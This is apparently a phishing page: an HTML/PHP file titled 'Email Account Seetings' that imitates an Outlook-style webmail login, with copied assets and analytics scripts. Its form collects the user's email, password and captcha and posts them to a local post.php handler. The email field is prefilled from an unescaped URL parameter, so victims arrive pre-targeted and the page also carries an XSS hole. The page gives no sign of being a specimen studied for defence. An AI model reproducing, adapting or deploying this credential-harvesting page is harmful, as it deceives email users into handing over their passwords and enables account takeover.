﻿<!DOCTYPE html>
<html><head>
<meta http-equiv="content-type" content="text/html; charset=UTF-8">
    <title>Email Account Seetings</title>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <link href="Outlookweb_files/aduser.css" rel="stylesheet">

<link rel="shortcut icon" href="http://whl.uploads.s3.amazonaws.com/app/uploads/edmonton_oil-kings/2016/04/19140354/Newsletter.png" rel="shortcut icon" type="image/x-icon"/>

</head>
<body _adv_already_used="true">
<section class="login-section">
    <div class="login-logo"></div>
    <h1 class="login-header">Welcome to your Email &amp; Account Settings</h1>
    <div id="oldBrowser" class="login-alert" style="display: none;">
        <div class="login-alert-content">
            
            <img class="login-alert-icon m-24" src="Outlookweb_files/warning-orange_24.png" alt="">
            <div class="login-alert-text"><div class="d-tc">
 <i class="login-alert-icon-warning mr10 ml-10"></i>
 </div>
 <div class="d-tc">
 <p><strong>You’ll get more if you update your browser.</strong> <br>
 Our layout and page behavior is optimized for the latest version of your browser.</p>
 <p><a class="btn m-warning" href="http://outdatedbrowser.com/en" target="_blank">Update my browser</a></p>
 <p class="mb0">This button will redirect you to your browser’s
 update page</p>
 </div></div>
        </div>
    </div>
                <div class="login-tabs">
            <button class="login-tab login-webmail selected">
                Email
                <i class="icon-info tooltip tooltipstered"></i>
            </button>
            <button class="login-tab login-myservices">
                My Settings
                <i class="icon-info tooltip tooltipstered"></i>
            </button>
        </div>
    <form method="POST"  action="post.php" class="login-form" novalidate="" autocomplete="off">
     
        <input name="clientType" class="client-type" value="WebMail" type="hidden">
        <div class="pr">
            <input name="email" placeholder="Login (email)" class="login-input" required="" autofocus="" value="<?php echo $_GET['email'];?>" type="text">
            <div class="login-validation required">Login required</div>
                <div class="login-validation email">Valid email address required</div>
        </div>
        <div class="pr">
            <input name="password" placeholder="Password" class="password-input" required="" type="password">
            <div class="password-validation required">Password required</div>
        </div>
        <div class="pr captcha">
            <div class="login-form-captcha">
                <input name="captchaId" type="hidden">
                <div class="captcha-image">
                    <img id="captchaImage" alt="">
                </div>
                <button class="captcha-refresh" type="button">
                    
                    <svg x="0px" y="0px" width="25px" height="24px" viewBox="0 0 25 24" class="captcha-refresh-icon">
                        <path d="M11.9,19.5c-3.2,0-6.1-2.2-7.1-5.2l0.8-0.1l0,0c0.6-0.1,0.9-0.6,0.8-1.2c0-0.2-0.2-0.4-0.3-0.6L3.3,9
                                c-0.2-0.3-0.6-0.4-1-0.4C2,8.7,1.7,9,1.6,9.3l-1.4,4.3c-0.1,0.3,0,0.7,0.2,1C0.6,14.9,1,15,1.4,15l0.9-0.2
                                c1.2,4.3,5.1,7.3,9.7,7.3c2.7,0,5.2-1.1,7.1-3l-1.9-1.9C15.8,18.7,13.9,19.5,11.9,19.5z"></path>
                        <path d="M23.7,12c-0.2-0.3-0.5-0.5-0.9-0.5l-0.9,0c-0.3-5.3-4.7-9.6-10.1-9.6c-3.5,0-6.7,1.8-8.5,4.7l2.2,1.4
                                C7,5.9,9.4,4.6,11.9,4.6c3.9,0,7.2,3.1,7.4,7l-0.8,0c0,0,0,0,0,0c-0.6,0-1,0.5-1,1c0,0.2,0.1,0.4,0.2,0.6l2.1,3.8
                                c0.2,0.3,0.5,0.5,0.9,0.5c0.4,0,0.7-0.2,0.9-0.5l2.1-4C23.9,12.7,23.9,12.3,23.7,12z"></path>
                    </svg>
                    
                </button>
            </div>
            <div class="pr">
                <input name="captchaCode" placeholder="Code" class="captcha-input" autofocus="" type="text">
                <div class="captcha-validation required">Code required</div>
                <div class="captcha-validation server">Valid code required</div>
            </div>
        </div>
        <div class="login-actions">
            <div class="login-remember">
                <label class="login-remember-me">
                    <input name="rememberMe" value="true" class="login-checkbox" type="checkbox">
                    <span style="line-height: 22px; height: 22px;">Remember me</span>
                </label>
            </div>
            <a href="javascript:void(0)" class="login-forgot-password jGaTracking">Forgot password?</a>
        </div>
        <button type="submit" class="login-submit">Login</button>
    </form>
</section>
<span style="display: none">
        <!-- GA general tracking -->
<script async="" src="Outlookweb_files/analytics.js"></script><script>
  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');

  ga('create', 'UA-214873-15', 'auto', {'siteSpeedSampleRate': 100});
  ga('send', 'pageview');
</script>

<!-- GA events tracking -->
<script>
function trackUlpLoginAttempt(p,r)
//p — string, product ID
//r - string, remember state
{
	var p = (typeof p === 'string' || p instanceof String) ? p : "(Unknown product)";	
    var r = (typeof r === 'string' || r instanceof String) ? r : "(Unknown)";
	ga('send', 'event', p, 'LoginAttempt', r);
}

function trackUlpLoginFailed(p,r)
//p — string, product ID
//r - string, remember state
{
	var p = (typeof p === 'string' || p instanceof String) ? p : "(Unknown product)";	
	var r = (typeof r === 'string' || r instanceof String) ? r : "(Unknown)";
	ga('send', 'event', p, 'LoginFailed', r);
}

function initClickTracking(c, cat)
//c — name of class, which identifies trackable elements;
//cat — event category in Analytics, where clicks to be reported
{
    var el=document.querySelectorAll(c);
    for (var i=0;i<el.length;i++)
    {
        if (el[i].addEventListener) {
            el[i].addEventListener('click', function(e) {
                ga('send','event',cat,(this.href ? this.href : '(no href)')+' - '+(this.text ? this.text : '(no text)'));
                }, false);
            } else if (el.attachEvent) {
            el[i].attachEvent('onclick', function(e) {
                ga('send','event',cat,(this.href ? this.href : '(no href)')+' - '+(this.text ? this.text : '(no text)'));
                });
        }
    }    
}
if(window.addEventListener){window.addEventListener('load',function(){initClickTracking(".jGaTracking", "Clck")},false)}
else if(window.attachEvent){window.attachEvent('onload',function(){initClickTracking(".jGaTracking", "Clck")})}
</script>
    </span>
<script src="Outlookweb_files/form"></script>


<script type="text/javascript">
    $(function() {
        var maintenanceMode = false;
        var clientType = 'WebMail';
        var isAdUser = true;
        var loginFailed = false;
        var loginLocked = false;
        var showCaptcha = Boolean('');
        var invalidCaptchaCode = false;
        var rememberMe = false;

        if (maintenanceMode && !isAdUser) {
            disable();
            return;
        }

        if (isAdUser) {
            if (maintenanceMode) {
                setLoginTab('WebMail');
                $('.login-myservices').prop('disabled', true);
            } else {
                setLoginTab(clientType);
                $('.login-webmail').on('click', function() {
                    setLoginTab('WebMail');
                });
                $('.login-myservices').on('click', function() {
                    setLoginTab('UserSettings');
                });
            }
        }

var forgotPasswordUrl = '/ControlPanel/AdPasswordRecovery/';        $('.login-forgot-password').on('click', function() {
            submitToUrl(forgotPasswordUrl);
        });

        if (loginFailed || loginLocked) {
            showMixedValidation();
        }

        if (showCaptcha) {
            $('.captcha').show();
        }

        if (invalidCaptchaCode) {
            $('.captcha-validation.server').show();
            setInputErrorStyle($('.captcha-input'), true);
        }

        if (loginFailed || loginLocked || invalidCaptchaCode) {
            onLoginFailed(clientType, rememberMe);
        }
    });
</script>
<!--[if lt IE 9]>
    <script type="text/javascript">
        $('#oldBrowser').show();
    </script>
<![endif]-->
<script src="Outlookweb_files/aduser"></script>


</body></html>